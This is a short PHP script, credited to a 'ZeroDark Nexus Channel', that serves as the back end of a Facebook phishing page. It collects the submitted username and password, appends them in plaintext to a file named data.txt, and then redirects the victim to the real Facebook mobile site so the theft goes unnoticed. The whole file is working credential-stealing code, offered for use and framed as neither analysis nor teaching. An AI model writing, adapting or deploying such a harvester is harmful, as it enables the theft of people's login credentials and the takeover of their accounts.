<?php
//Create by ZeroDark Nexus Channel 
// Mahadeb R..das
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];

    $file = fopen("data.txt", "a");
    fwrite($file, "Email,user:==> " . $username . "\n");
    fwrite($file, "Password.:==> " . $password . "\n");
    fwrite($file, "-------------------------\n");
    fclose($file);

    // login page with an error message
    header("Location: https://m.facebook.com/");
    exit();
} 
?>